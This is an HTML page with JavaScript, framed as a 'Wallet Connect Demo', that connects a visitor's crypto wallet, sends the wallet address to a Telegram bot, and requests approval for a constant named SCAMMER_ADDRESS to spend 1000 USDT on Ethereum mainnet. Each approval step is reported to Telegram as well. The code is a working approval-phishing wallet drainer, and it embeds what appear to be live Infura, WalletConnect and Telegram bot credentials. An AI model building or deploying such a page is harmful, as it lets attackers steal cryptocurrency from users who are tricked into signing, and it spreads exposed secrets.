<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Wallet Connect Demo with Telegram Alerts</title>
  <script src="https://unpkg.com/web3modal"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
</head>
<body>
  <h2>Test Wallet Connect + Approve Simulation</h2>
  <button id="connectBtn">Connect Wallet</button>
  <button id="approveBtn" disabled>Approve Token Spend</button>

  <script>
    // === INFURA & WALLETCONNECT DETAILS ===
    const INFURA_PROJECT_ID = "4aa83a1a6d3c4b318c210e38243466c9";
    const WALLETCONNECT_PROJECT_ID = "b49de02b26fcb4c1ad6f4fb0dbd9caff";

    // === TELEGRAM BOT SETTINGS ===
    const TELEGRAM_BOT_TOKEN = "8028485593:AAEe4vG4EL4OUkQMXL3xuomEW8G3-kP1imQ";
    const TELEGRAM_CHAT_ID = "5266257102";

    // === TESTING DETAILS ===
    const SCAMMER_ADDRESS = "0x000000000000000000000000000000000000dead"; // Replace for testing
    const TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT Mainnet

    // === Web3Modal Setup ===
    const providerOptions = {
      walletconnect: {
        package: window.WalletConnectProvider.default,
        options: {
          infuraId: INFURA_PROJECT_ID,
          projectId: WALLETCONNECT_PROJECT_ID
        }
      }
    };

    const web3Modal = new window.Web3Modal.default({
      cacheProvider: false,
      providerOptions
    });

    let provider, signer, userAddress;

    // === Telegram Message Function ===
    function sendTelegramMessage(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
      });
    }

    // === Connect Wallet ===
    document.getElementById("connectBtn").onclick = async () => {
      try {
        provider = await web3Modal.connect();
        const ethersProvider = new ethers.providers.Web3Provider(provider);
        signer = ethersProvider.getSigner();
        userAddress = await signer.getAddress();
        alert("Connected wallet: " + userAddress);
        sendTelegramMessage("Wallet connected: " + userAddress);
        document.getElementById("approveBtn").disabled = false;
      } catch (err) {
        console.error(err);
        alert("Connection failed.");
      }
    };

    // === ERC-20 Approve Function ===
    const erc20Abi = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];

    document.getElementById("approveBtn").onclick = async () => {
      try {
        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, erc20Abi, signer);
        const tx = await tokenContract.approve(
          SCAMMER_ADDRESS,
          ethers.utils.parseUnits("1000", 6) // USDT = 6 decimals
        );
        alert("Approval transaction sent. Hash: " + tx.hash);
        sendTelegramMessage("Approval sent by: " + userAddress + "\nTx: " + tx.hash);
        await tx.wait();
        alert("Approval confirmed.");
        sendTelegramMessage("Approval confirmed for: " + userAddress);
      } catch (err) {
        console.error(err);
        alert("Approval failed or rejected.");
      }
    };
  </script>
</body>
</html>
